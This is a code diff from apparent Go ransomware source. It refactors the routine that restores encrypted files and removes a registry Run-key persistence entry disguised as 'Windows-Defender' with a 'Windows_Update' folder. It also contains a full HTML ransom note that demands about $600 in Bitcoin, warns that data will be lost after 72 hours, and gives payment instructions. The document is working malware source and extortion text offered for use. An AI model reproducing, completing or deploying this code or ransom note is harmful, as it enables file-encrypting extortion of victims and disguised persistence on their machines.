@@ -8,15 +8,15 @@ import (
 	"../spread"
 )
 
-var PRICE = 600
+
 
 func End() {
 	//Decrypt
 	spread.EncryptExternalDrives(false)
-	spread.EncryptDocumets("C:\\", false)
+	aes.EncryptDocumets("C:\\", false)
 
 	//REmove key
-	utils.Run("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows-Defender /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
+	utils.Run("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows-Defender /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + utils.TARGET_FILE_NAME)
 
 	//Delete home
 	os.RemoveAll(os.Getenv("APPDATA") + "\\Windows_Update")
@@ -40,8 +40,8 @@ is no way to detrypt them by yourself.</p>
 <p>If you want to decrypt them you have to pay aproximatly <b>600$</b> in Bitcoins<br>
 to the following address:</p>
 
-<p>Amount: <b>` + string(PRICE) + ` BTCs</b><br>
-To the address: <b>` + BTC_ADDRESS + `</b></p>
+<p>Amount: <b>` + string(utils.PRICE) + ` BTCs</b><br>
+To the address: <b>` + utils.BTC_ADDRESS + `</b></p>
 
 <p>Do not worry if you don't know what bitcoins are, they are an online currency<br>
 that is not regulated by any goverment, the price changes daily but now is near the 600$ usd dollars<br>
@@ -61,7 +61,7 @@ I recommend you look for info online if you don't want to use coinbase.com</p>
 <p>IT IS EXTREMELY IMPORTANT THAT YOU SEND THE EXACT AMMOUNT AND THAT THIS PROGRAM IS RUNNING <br>
 WHILE YOU MAKE THE PAYMENT TO BE ABLE TO CONFIRM THE TRANSACTION.</p>
 
-<p>If you can't figure out something send me an email to EMAIL<br>
+<p>If you can't figure out something send me an email to `+ utils.EMAIL+`<br>
 You have 72 hours form now on to send the payment or you will lose all the data so don't <br>
 wait to send an email if you don't know something.</p>
 
